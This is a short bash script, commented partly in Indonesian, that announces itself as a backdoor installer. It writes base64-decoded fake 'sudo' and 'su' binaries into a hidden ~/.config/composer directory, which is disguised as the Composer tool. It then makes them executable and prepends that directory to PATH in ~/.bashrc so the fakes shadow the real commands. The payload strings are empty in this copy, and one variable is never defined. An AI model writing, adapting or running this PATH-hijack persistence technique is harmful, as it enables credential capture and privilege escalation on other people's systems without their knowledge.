#!/bin/bash

# === CONFIG ===
BACKDOOR_DIR="$HOME/.config/composer"    
BINARYSUDO=""
BINARYSU=""

# === BUAT DIR ===
mkdir -p "$BACKDOOR_DIR"

# === FAKE SUDO ===
echo $BINARYSUDO | base64 -d > "$BACKDOOR_DIR/sudo"

echo $BINARYSU | base64 -d > "$BACKDOOR_DIR/su"

chmod 755 "$BACKDOOR_DIR/sudo"
chmod 755 "$BACKDOOR_DIR/su"

BASHRC="$HOME/.bashrc"
BACKDOOR_PATH='export PATH="$HOME/.config/composer:$PATH"'

if ! grep -q ".config/composer" "$BASHRC" 2>/dev/null; then
    echo "" >> "$BASHRC"
    echo "$BACKDOOR_PATH" >> "$BASHRC"
    echo "" >> "$BASHRC"
fi

# === EXPORT SEKARANG ===
export PATH="$BACKDOOR_DIR:$PATH"

# === PESAN AKHIR ===
echo "[+] Backdoor installed!"
echo "[+] Path: $BACKDOOR_DIR"
echo "[+] Log: $LOGFILE"
echo "[+] Jalankan 'sudo' atau 'su' buat test."

echo " Backdoor activated on $(hostname) as $(whoami) at $(date)"
